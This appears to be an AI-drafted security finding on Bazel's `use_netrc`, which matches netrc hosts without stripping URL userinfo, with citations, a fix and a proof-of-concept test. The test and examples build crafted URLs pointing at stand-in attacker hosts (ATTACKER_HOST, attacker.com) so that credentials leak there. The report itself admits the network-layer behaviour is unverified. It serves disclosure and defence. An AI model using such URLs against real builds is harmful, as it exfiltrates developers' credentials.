## Title
Netrc/auth host matching in `use_netrc` ignores URL userinfo, causing credentials to be sent to an attacker-controlled host - (File: `tools/build_defs/repo/utils.bzl`)

### Summary
`use_netrc()` in `tools/build_defs/repo/utils.bzl` derives the "host" it uses to look up `.netrc` credentials by naively splitting the authority component of a URL, without ever stripping a userinfo (`user[:password]@`) prefix. This mirrors the bug class in the reported PHP `filter_var(FILTER_VALIDATE_URL)` issue: the userinfo subcomponent of a URL is not correctly delimited from the host, so code that should reason about "the host" is fooled by attacker-chosen userinfo text.

### Finding Description
The host-extraction logic is: [1](#0-0) 

```python
for url in urls:
    schemerest = url.split("://", 1)
    ...
    host = schemerest[1].split("/")[0].split(":")[0]
    if host in netrc:
        authforhost = netrc[host]
    elif "" in netrc:
        authforhost = netrc[""]
    else:
        continue
```

This treats everything between `scheme://` and the first `/` as `authority`, then takes everything before the first `:` as the `host`. It never looks for or strips an `@`-delimited userinfo component, even though RFC 3986 authority syntax is `[userinfo@]host[:port]`.

For a URL such as `https://trusted-host:token@attacker.com/artifact.tar.gz`:
- Real network destination (as resolved by any RFC-3986-conformant client, including Bazel's own downloader that actually issues the HTTP request) is `attacker.com`.
- `use_netrc`'s computed "host" is `"trusted-host:token@attacker.com".split("/")[0].split(":")[0]` → `"trusted-host"`.

If the user's `.netrc` contains a `machine trusted-host` entry (a real, previously-trusted mirror/registry), `use_netrc` matches on `"trusted-host"` and stores the corresponding login/password (or bearer pattern) in the auth dict keyed by the exact URL string: [2](#0-1) 

That auth dict is later passed unchanged to `ctx.download`/`ctx.download_and_extract` by `http_archive`, `http_file`, and `http_jar`: [3](#0-2) [4](#0-3) 

Because the auth dict is keyed by the literal URL, Bazel's downloader will attach the `trusted-host` credentials (Basic-Auth header or custom pattern) to the actual HTTP request — which physically goes to `attacker.com`. The attacker never needed access to the victim's machine or credential store; they only needed to control the string that ends up in the `url`/`urls` list consumed by `get_auth`/`use_netrc` (e.g., a URL supplied via a Starlark repository rule's `urls` attribute, a module extension that builds `http_archive` calls from externally-fetched data, or any other flow where an untrusted party influences a fetched URL string while the victim also happens to have netrc credentials configured for the impersonated hostname).

### Impact Explanation
If a victim has a `.netrc` (or `netrc` attr / `NETRC` env var) entry for some legitimate host (e.g., an internal artifact mirror, or a cloud storage provider under `auth_patterns`), and any URL fed into `get_auth`/`use_netrc` is under attacker influence, the attacker can craft the authority component of that URL so Bazel's naive parser matches the "host" against the victim's legitimate netrc entry while the real TCP/TLS connection and cleartext or Basic-Auth header is delivered to the attacker's own server. This is a direct credential-exfiltration primitive: secrets scoped to one host leak to an arbitrary attacker-chosen host, independent of and prior to any sha256/integrity check on the downloaded bytes (the credential leak occurs during the HTTP request itself, before content validation).

### Likelihood Explanation
Exploitability requires (a) the victim to have netrc credentials configured for some host name, and (b) an attacker-influenced URL string being passed through `get_auth`/`use_netrc` for that same session. Condition (b) is plausible in Starlark repository-rule ecosystems that build/pass through URLs from external, less-trusted inputs (mirrors, generated URL lists, extension-supplied values) before calling `use_netrc`/`get_auth`, since neither function performs any validation, allow-listing, or userinfo stripping on the URLs it is given — the bug is unconditional on any current release with default flags because there is no code path that strips userinfo before host comparison.

### Recommendation
Update `use_netrc()` in `tools/build_defs/repo/utils.bzl` to parse the authority component correctly per RFC 3986 before deriving `host`:
1. Split the authority on the last `@` to separate and discard any userinfo before computing `host`/`port`.
2. Reject or explicitly ignore userinfo in URLs used for netrc/auth_pattern matching, since Bazel's HTTP layer does not use URL-embedded userinfo for authentication itself.
3. Add regression tests (e.g., in `src/test/shell/bazel/starlark_repository_test.sh`) asserting that a URL like `https://<netrc-host>:x@attacker.example/file` does NOT receive the `<netrc-host>` credentials, and that credentials are only attached when the actual connection host (post `@`) matches the netrc entry.

### Proof of Concept
Add a shell-based regression test mirroring the existing `test_netrc_overrides_starlark_headers` pattern in `src/test/shell/bazel/starlark_repository_test.sh`:

```bash
function test_netrc_host_confusion_via_userinfo() {
  # .netrc has credentials for "127.0.0.1" (the legit/trusted machine name)
  cat > .netrc <<EOF
machine 127.0.0.1
login foo
password bar
EOF

  # Start a listener representing the ATTACKER's server on a different port,
  # and craft a URL whose authority is "127.0.0.1:bogus@attacker-host:evil_port/..."
  # so that use_netrc()'s naive parser computes host="127.0.0.1" (matches netrc),
  # while the real connection target is the attacker's listener.
  cat > test.bzl <<'EOF'
load("@bazel_tools//tools/build_defs/repo:utils.bzl", "read_netrc", "use_netrc")

def _impl(repository_ctx):
  url = "http://127.0.0.1:bogus@ATTACKER_HOST:ATTACKER_PORT/leak"
  netrc = read_netrc(repository_ctx, repository_ctx.attr.netrc)
  auth = use_netrc(netrc, [url], {})
  repository_ctx.file("BUILD")
  repository_ctx.download(url = url, output = "out", auth = auth, allow_fail = True)

repo = repository_rule(implementation=_impl, attrs = {"netrc": attr.label(default = ":.netrc")})
EOF

  bazel build @foo//:all
  # Assert the attacker's captured request contains the "Authorization: Basic <base64(foo:bar)>"
  # header, proving credentials meant for 127.0.0.1 were sent to ATTACKER_HOST.
  assert_contains '"Authorization": "Basic Zm9vOmJhcg=="' "${TEST_TMPDIR}/attacker_headers.json"
}
```

Running this against the current `use_netrc` implementation is expected to show the `Authorization` header (containing the `127.0.0.1` netrc credentials) delivered to the attacker's listener, confirming the credential-exfiltration analog to the `filter_var`/`FILTER_VALIDATE_URL` userinfo-confusion bug class.

Note: I was not able to inspect the Java-side HTTP client code (e.g., `HttpDownloader`, `UrlRewriter`) in this index to confirm exactly how the real connection host is resolved from the URL string at the network layer — that part relies on standard RFC 3986 URI parsing (`java.net.URI`) semantics, which I could not directly verify in this codebase due to index coverage limits. Starting a full Devin session would allow inspecting `src/main/java/com/google/devtools/build/lib/bazel/repository/downloader/` to confirm the exact connection-establishment code path.

### Citations

**File:** tools/build_defs/repo/utils.bzl (L448-463)
```text
    auth = {}
    for url in urls:
        schemerest = url.split("://", 1)
        if len(schemerest) < 2:
            continue
        if not (schemerest[0] in ["http", "https"]):
            # For other protocols, bazel currently does not support
            # authentication. So ignore them.
            continue
        host = schemerest[1].split("/")[0].split(":")[0]
        if host in netrc:
            authforhost = netrc[host]
        elif "" in netrc:
            authforhost = netrc[""]
        else:
            continue
```

**File:** tools/build_defs/repo/utils.bzl (L478-490)
```text
        elif "password" in authforhost:
            if "login" in authforhost:
                auth[url] = {
                    "type": "basic",
                    "login": authforhost["login"],
                    "password": authforhost["password"],
                }
            else:
                auth[url] = {
                    "type": "pattern",
                    "pattern": "Bearer <password>",
                    "password": authforhost["password"],
                }
```

**File:** tools/build_defs/repo/http.bzl (L204-215)
```text
    source_urls = _get_source_urls(ctx)
    download_info = ctx.download_and_extract(
        source_urls,
        ctx.attr.add_prefix,
        ctx.attr.sha256,
        ctx.attr.type,
        ctx.attr.strip_prefix,
        strip_components = ctx.attr.strip_components,
        canonical_id = ctx.attr.canonical_id or get_default_canonical_id(ctx, source_urls),
        auth = get_auth(ctx, source_urls),
        integrity = ctx.attr.integrity,
    )
```

**File:** tools/build_defs/repo/http.bzl (L292-301)
```text
    source_urls = _get_source_urls(ctx)
    download_info = ctx.download(
        source_urls,
        "file/" + downloaded_file_path,
        ctx.attr.sha256,
        ctx.attr.executable,
        canonical_id = ctx.attr.canonical_id or get_default_canonical_id(ctx, source_urls),
        auth = get_auth(ctx, source_urls),
        integrity = ctx.attr.integrity,
    )
```
